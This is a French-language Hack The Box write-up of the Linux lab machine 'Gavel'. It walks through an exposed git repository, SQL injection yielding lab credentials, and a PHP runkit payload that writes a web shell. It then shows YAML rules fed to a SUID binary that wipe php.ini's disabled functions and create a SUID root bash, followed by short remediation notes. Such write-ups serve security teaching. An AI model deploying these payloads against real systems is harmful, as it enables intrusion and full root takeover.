---
id: "HTB-2026-GAVEL"
title: "Gavel"
excerpt: "Sur **Gavel**, l'accès initial commence par la découverte d'un dépôt git exposé révélant une injection SQL. Nous en extrayons les identifiants administrateur. N"
date: "2025-11-29"
tags: ["WRITEUP", "HACKTHEBOX", "LINUX", "MEDIUM", "SQLI", "RUNKIT", "SUID-EXECUTION"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "LINUX"
difficulty: "MEDIUM"
icon: "Terminal"
author: "0x7CC"
published: true
---

# Hack The Box — Gavel (Linux) Write-Up : Fuite Git PHP → RCE runkit → Élévation SUID

## TL;DR
Sur **Gavel**, l'accès initial commence par la découverte d'un dépôt git exposé révélant une injection SQL. Nous en extrayons les identifiants administrateur. Nous exploitons ensuite la fonction PHP `runkit_function_add` de l'interface d'administration pour obtenir une RCE en tant que `www-data`. L'élévation de privilèges s'effectue en exploitant le binaire `gavel-util` pour contourner les restrictions PHP et générer un shell SUID root.

---

## Cible
- Host : `gavel.htb`
- IP : `10.129.8.61`

---

## Recon : Dépôt Git et Injection SQL
Le scan Nmap révèle le port 80. Nous découvrons un répertoire `.git` exposé. L'extraction du code source montre une vulnérabilité SQLi dans `inventory.php`.

Nous dumpons la base et obtenons :
- Utilisateur : `auctioneer`
- Mot de passe : `midnight1`

---

## Accès Initial : RCE via runkit
Nous nous connectons sur `admin.php`. L'ajout de règles d'enchères utilise la fonction PHP `runkit_function_add`.

Nous injectons le payload :
```php
file_put_contents('../shell.php', '<?php system($_GET["c"]); ?>'); return true;
```

Nous déclenchons l'évaluation de la règle pour écrire notre shell, obtenons un reverse shell `www-data`, puis passons à l'utilisateur `auctioneer`.

---

## Élévation de privilèges : Abus de gavel-util
Le binaire SUID `gavel-util` exécute des fichiers YAML de règles. Nous soumettons d'abord un fichier pour écraser `php.ini` et désactiver les fonctions interdites :

```yaml
name: fixini
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
```

Puis un deuxième pour copier et rendre SUID bash :
```yaml
name: rootshell
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
```

---

## Notes défensives / remédiation

### Correctif
- Empêcher l'exposition du dossier `.git`.
- Proscrire l'évaluation dynamique de code via `runkit` sur des entrées utilisateur.
- Ne pas accorder de droits privilégiés à des binaires qui évaluent des scripts dynamiques.

---

## Annexe : Résumé de la timeline
1. Extraction du dépôt git et obtention de la SQLi.
2. RCE via injection runkit et reverse shell.
3. Modification de php.ini via le binaire `gavel-util`.
4. Création du shell SUID root via `gavel-util`.

---